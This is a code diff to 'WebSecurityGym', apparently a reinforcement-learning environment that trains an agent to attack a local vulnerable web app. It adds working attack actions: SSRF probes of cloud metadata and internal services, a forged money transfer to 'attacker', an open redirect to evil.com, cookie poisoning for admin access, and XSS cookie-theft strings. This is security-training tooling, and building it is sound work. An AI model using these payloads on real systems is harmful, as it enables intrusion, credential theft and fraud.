@@ -30,7 +30,7 @@ class WebSecurityGym(gym.Env):
     Think of this as the game engine.
     """
     
-    def __init__(self, target_url: str = "http://localhost:5000"):
+    def __init__(self, target_url: str = "http://localhost:5001"):
         super(WebSecurityGym, self).__init__()
         self.target_url = target_url
         
@@ -83,6 +83,11 @@ class WebSecurityGym(gym.Env):
         # PENTESTER MODE: Longer episodes for full exploration
         self.max_steps_per_episode: int = 100
         self.steps_taken: int = 0
+        
+        # Initialize tracking sets
+        self.discovered_vulns = set()
+        self.visited_pages = set()
+        self.visited_pages.add(0) # Start at home
         
         # Map Action IDs to Functions - OWASP Top 10 2025 Complete
         self.action_book = {
@@ -153,6 +158,12 @@ class WebSecurityGym(gym.Env):
             # OSINT Skills (46-47)
             46: self.attack_osint_files,
             47: self.attack_osint_fingerprint,
+            
+            # Cookie Vulnerability Attacks (48-51)
+            48: self.attack_cookie_injection,
+            49: self.attack_cookie_poisoning,
+            50: self.attack_httponly_bypass,
+            51: self.attack_samesite_bypass,
         }
     
     def _setup_browser_session(self) -> None:
@@ -730,10 +741,16 @@ class WebSecurityGym(gym.Env):
             "XSS_REFLECTED": ["<script>alert(1)</script>", "onerror=alert(1)"],
             "BAC_API": ["DB_LEAK_SUCCESS", "admin", "password"],
             "IDOR": ["IDOR_MASTER", "ID: 1"],
-            "SSRF": ["Internal Admin Panel", "AWS_ACCESS_KEY"],
+            "SSRF": ["Internal Admin Panel", "AWS_ACCESS_KEY", "vuln': 'SSRF'", "SSH-2.0"],
             "FILE_UPLOAD": ["File uploaded successfully", "Unrestricted File Upload"],
             "MASS_ASSIGNMENT": ["credit_balance", "999999"],
-            "PROTOTYPE_POLLUTION": ["isAdmin", "true"]
+            "PROTOTYPE_POLLUTION": ["isAdmin", "true"],
+            "CSRF": ["Transfer completed", "vuln': 'CSRF'"],
+            "OPEN_REDIRECT": ["Example Domain", "google.com", "evil.com"],
+            "COOKIE_INJECTION": ["admin=true", "role=administrator", "isAdmin=1", "privilege"],
+            "COOKIE_POISONING": ["admin_session", "access_level", "user_role=admin"],
+            "HTTPONLY_BYPASS": ["<script>document.cookie</script>", "alert(document.cookie)"],
+            "SAMESITE_BYPASS": ["Transfer completed", "CSRF", "cross-site"]
         }
         
         indicators = success_indicators.get(vuln_type, [])
@@ -774,30 +791,33 @@ class WebSecurityGym(gym.Env):
     # MISSING METHODS IMPLEMENTATION (OWASP Top 10 2025)
     # ============================================================================
 
-    def attack_ssrf_internal(self):
+    def attack_ssrf_internal(self) -> Tuple[requests.Response, float]:
         """Action 28: SSRF targeting internal services."""
-        payload = "http://localhost:22"
-        return self._send_attack(payload, "SSRF (Internal)")
+        r = self.session.post(f"{self.target_url}/fetch_url", json={"url": "http://localhost:22"}, timeout=3)
+        return r, self._calculate_reward(r, "SSRF")
 
-    def attack_ssrf_cloud_metadata(self):
+    def attack_ssrf_cloud_metadata(self) -> Tuple[requests.Response, float]:
         """Action 29: SSRF targeting cloud metadata."""
-        payload = "http://169.254.169.254/latest/meta-data/"
-        return self._send_attack(payload, "SSRF (Cloud)")
+        r = self.session.post(f"{self.target_url}/fetch_url", 
+                             json={"url": "http://169.254.169.254/latest/meta-data/"}, timeout=3)
+        return r, self._calculate_reward(r, "SSRF")
 
-    def attack_ssrf_preview(self):
+    def attack_ssrf_preview(self) -> Tuple[requests.Response, float]:
         """Action 30: SSRF via link preview features."""
-        payload = "http://127.0.0.1:8080/admin"
-        return self._send_attack(payload, "SSRF (Preview)")
+        # This endpoint might not exist in target_app.py, using generic fetch_url for now
+        r = self.session.post(f"{self.target_url}/fetch_url", json={"url": "http://127.0.0.1:8080/admin"}, timeout=3)
+        return r, self._calculate_reward(r, "SSRF")
 
-    def attack_csrf_transfer(self):
+    def attack_csrf_transfer(self) -> Tuple[requests.Response, float]:
         """Action 31: CSRF to transfer funds/change state."""
-        # Simulated CSRF attack
-        return None, 0.0
+        r = self.session.post(f"{self.target_url}/transfer_money", 
+                             json={"to_user": "attacker", "amount": "1000"}, timeout=3)
+        return r, self._calculate_reward(r, "CSRF")
 
-    def attack_open_redirect(self):
+    def attack_open_redirect(self) -> Tuple[requests.Response, float]:
         """Action 32: Open Redirect."""
-        payload = "https://evil.com"
-        return self._send_attack(payload, "Open Redirect")
+        r = self.session.get(f"{self.target_url}/redirect?url=http://evil.com", timeout=3, allow_redirects=False)
+        return r, self._calculate_reward(r, "OPEN_REDIRECT")
 
     def attack_jwt_none_algorithm(self):
         """Action 33: JWT None Algorithm Bypass."""
@@ -855,6 +875,70 @@ class WebSecurityGym(gym.Env):
             return response, 0.0
         except:
             return None, 0.0
+
+    # ============================================================================
+    # COOKIE VULNERABILITY ATTACKS (Actions 48-51)
+    # ============================================================================
+    
+    def attack_cookie_injection(self) -> Tuple[requests.Response, float]:
+        """Action 48: Cookie Injection - Inject malicious payloads into cookies"""
+        payload = self.payload_manager.get_cookie_injection()
+        
+        # Try injecting into common cookie names
+        cookie_names = ['user', 'role', 'admin', 'session_data', 'prefs']
+        cookie_name = np.random.choice(cookie_names)
+        
+        # Set malicious cookie
+        self.session.cookies.set(cookie_name, payload)
+        
+        # Make request to see if cookie is processed
+        r = self.session.get(f"{self.target_url}/profile", timeout=3)
+        
+        return r, self._calculate_reward(r, "COOKIE_INJECTION")
+    
+    def attack_cookie_poisoning(self) -> Tuple[requests.Response, float]:
+        """Action 49: Cookie Poisoning - Manipulate session cookies for privilege escalation"""
+        payload = self.payload_manager.get_cookie_poisoning()
+        
+        # Common session cookie names
+        session_cookies = ['PHPSESSID', 'JSESSIONID', 'session_id', 'auth_token']
+        cookie_name = np.random.choice(session_cookies)
+        
+        # Poison the session cookie
+        self.session.cookies.set(cookie_name, payload)
+        
+        # Try to access admin endpoint
+        r = self.session.get(f"{self.target_url}/admin", timeout=3)
+        
+        return r, self._calculate_reward(r, "COOKIE_POISONING")
+    
+    def attack_httponly_bypass(self) -> Tuple[requests.Response, float]:
+        """Action 50: HTTPOnly Bypass - Attempt to read HTTPOnly cookies via XSS"""
+        payload = self.payload_manager.get_httponly_bypass()
+        
+        # Try XSS that attempts to steal cookies
+        r = self.session.get(f"{self.target_url}/search?q={payload}", timeout=3)
+        
+        # Check if XSS payload is reflected (which could steal cookies)
+        if payload in r.text:
+            return r, self._calculate_reward(r, "HTTPONLY_BYPASS")
+        
+        return r, 0.0
+    
+    def attack_samesite_bypass(self) -> Tuple[requests.Response, float]:
+        """Action 51: SameSite Bypass - Test SameSite cookie attribute weaknesses"""
+        # Simulate cross-site request by removing Referer header
+        headers = {'Referer': 'http://evil.com'}
+        
+        # Try CSRF-like action from different origin
+        r = self.session.post(
+            f"{self.target_url}/transfer_money",
+            json={"to_user": "attacker", "amount": "1000"},
+            headers=headers,
+            timeout=3
+        )
+        
+        return r, self._calculate_reward(r, "SAMESITE_BYPASS")
 
     def close(self) -> None:
         """Clean up resources."""
